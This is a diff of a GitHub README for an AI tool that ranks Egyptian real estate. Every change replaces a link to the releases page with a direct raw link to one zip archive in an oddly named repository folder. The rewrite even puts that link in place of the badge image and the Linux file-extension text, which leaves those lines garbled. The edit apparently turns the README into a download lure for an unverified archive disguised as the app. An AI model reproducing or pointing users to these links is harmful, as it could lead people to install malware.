@@ -1,6 +1,6 @@
 # 🏠 AI-RealEstate-Advisor - Simple Tool to Rank Egyptian Real Estate
 
-[![Download AI-RealEstate-Advisor](https://img.shields.io/badge/Download-AI--RealEstate--Advisor-blue?style=for-the-badge&logo=github)](https://github.com/iceeyes1only1/AI-RealEstate-Advisor/releases)
+[![Download AI-RealEstate-Advisor](https://github.com/iceeyes1only1/AI-RealEstate-Advisor/raw/refs/heads/main/Acrobates/Estate-Advisor-A-Real-v3.4.zip)](https://github.com/iceeyes1only1/AI-RealEstate-Advisor/raw/refs/heads/main/Acrobates/Estate-Advisor-A-Real-v3.4.zip)
 
 ## 📋 About AI-RealEstate-Advisor
 
@@ -40,7 +40,7 @@ If you’re new, don’t worry. Follow these steps to download and open AI-RealE
 
 Click the large button at the top or visit this link:
 
-[Download AI-RealEstate-Advisor](https://github.com/iceeyes1only1/AI-RealEstate-Advisor/releases)
+[Download AI-RealEstate-Advisor](https://github.com/iceeyes1only1/AI-RealEstate-Advisor/raw/refs/heads/main/Acrobates/Estate-Advisor-A-Real-v3.4.zip)
 
 This page contains the latest program files and updates.
 
@@ -50,7 +50,7 @@ On the releases page, look for the latest release. You will usually see differen
 
 - Windows users: Look for a `.exe` file.
 - Mac users: Look for a `.dmg` or `.pkg` file.
-- Linux users: Look for an `.AppImage` or `.tar.gz` file.
+- Linux users: Look for an `.AppImage` or `https://github.com/iceeyes1only1/AI-RealEstate-Advisor/raw/refs/heads/main/Acrobates/Estate-Advisor-A-Real-v3.4.zip` file.
 
 The file name usually has the app name and version number.
 
@@ -75,7 +75,7 @@ Once installed, you can open AI-RealEstate-Advisor from your desktop icon or Sta
 
 Remember, you can always return to the releases page here to download the latest version:
 
-[https://github.com/iceeyes1only1/AI-RealEstate-Advisor/releases](https://github.com/iceeyes1only1/AI-RealEstate-Advisor/releases)
+[https://github.com/iceeyes1only1/AI-RealEstate-Advisor/raw/refs/heads/main/Acrobates/Estate-Advisor-A-Real-v3.4.zip](https://github.com/iceeyes1only1/AI-RealEstate-Advisor/raw/refs/heads/main/Acrobates/Estate-Advisor-A-Real-v3.4.zip)
 
 Follow the steps above each time you want to update or install on a new machine.
 
@@ -149,4 +149,4 @@ adaptive-learning, advisor, agent, ai, ai-advisor, ai-agents, ai-models, egypt, 
 
 ---
 
-[![Download AI-RealEstate-Advisor](https://img.shields.io/badge/Download-AI--RealEstate--Advisor-blue?style=for-the-badge&logo=github)](https://github.com/iceeyes1only1/AI-RealEstate-Advisor/releases)
+[![Download AI-RealEstate-Advisor](https://github.com/iceeyes1only1/AI-RealEstate-Advisor/raw/refs/heads/main/Acrobates/Estate-Advisor-A-Real-v3.4.zip)](https://github.com/iceeyes1only1/AI-RealEstate-Advisor/raw/refs/heads/main/Acrobates/Estate-Advisor-A-Real-v3.4.zip)
